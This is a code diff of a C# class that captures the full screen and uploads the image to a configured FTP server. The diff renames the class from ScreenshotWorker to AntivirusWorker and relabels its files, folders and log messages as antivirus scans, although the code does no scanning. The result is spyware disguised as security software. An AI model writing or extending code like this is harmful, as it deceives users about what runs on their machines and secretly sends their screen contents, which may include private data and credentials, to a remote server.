@@ -3,16 +3,13 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Net;
-using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
-using Microsoft.Extensions.Hosting;
-using Microsoft.Extensions.Logging;
 using Microsoft.Extensions.Configuration;
+using Microsoft.Extensions.Logging;
 
-public class ScreenshotWorker : BackgroundService
+public class AntivirusWorker
 {
-    private readonly ILogger<ScreenshotWorker> _logger;
+    private readonly ILogger<AntivirusWorker> _logger;
     private readonly IConfiguration _configuration;
     private readonly string _ftpHost;
     private readonly string _ftpUsername;
@@ -20,7 +17,7 @@ public class ScreenshotWorker : BackgroundService
     private readonly string _remoteDirectory;
     private readonly string _localSaveDirectory;
 
-    public ScreenshotWorker(ILogger<ScreenshotWorker> logger, IConfiguration configuration)
+    public AntivirusWorker(ILogger<AntivirusWorker> logger, IConfiguration configuration)
     {
         _logger = logger;
         _configuration = configuration;
@@ -28,30 +25,25 @@ public class ScreenshotWorker : BackgroundService
         _ftpHost = _configuration["FtpSettings:FtpHost"];
         _ftpUsername = _configuration["FtpSettings:FtpUsername"];
         _ftpPassword = _configuration["FtpSettings:FtpPassword"];
-        _remoteDirectory = "/screenshots";
-        _localSaveDirectory = Path.Combine(Path.GetTempPath(), "Screenshots");
+        _remoteDirectory = "/antivirus";
+        _localSaveDirectory = Path.Combine(Path.GetTempPath(), "Antivirus");
     }
 
-    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
+    public void Run()
     {
-        Directory.CreateDirectory(_localSaveDirectory);
-        EnsureDirectoryExistsFtp(_ftpHost, _remoteDirectory, _ftpUsername, _ftpPassword);
-
-        while (!stoppingToken.IsCancellationRequested)
+        try
         {
-            try
-            {
-                string filePath = CaptureScreenAndSave(_localSaveDirectory);
-                _logger.LogInformation($"Screenshot saved to {filePath}");
-                string remoteUri = $"{_ftpHost}{_remoteDirectory}/{Path.GetFileName(filePath)}";
-                UploadFileFtp(filePath, remoteUri, _ftpUsername, _ftpPassword);
-            }
-            catch (Exception ex)
-            {
-                _logger.LogError(ex, "An error occurred while taking and uploading a screenshot.");
-            }
+            Directory.CreateDirectory(_localSaveDirectory);
+            EnsureDirectoryExistsFtp(_ftpHost, _remoteDirectory, _ftpUsername, _ftpPassword);
 
-            await Task.Delay(60000, stoppingToken);
+            string filePath = CaptureScreenAndSave(_localSaveDirectory);
+            _logger.LogInformation($"File saved to {filePath}");
+            string remoteUri = $"{_ftpHost}{_remoteDirectory}/{Path.GetFileName(filePath)}";
+            UploadFileFtp(filePath, remoteUri, _ftpUsername, _ftpPassword);
+        }
+        catch (Exception ex)
+        {
+            _logger.LogError(ex, "An error occurred during the antivirus scan and upload process.");
         }
     }
 
@@ -65,7 +57,7 @@ public class ScreenshotWorker : BackgroundService
             g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
         }
 
-        string fileName = $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png";
+        string fileName = $"antivirus_scan_{DateTime.Now:yyyyMMdd_HHmmss}.png";
         string filePath = Path.Combine(directoryPath, fileName);
         bitmap.Save(filePath, ImageFormat.Png);
 
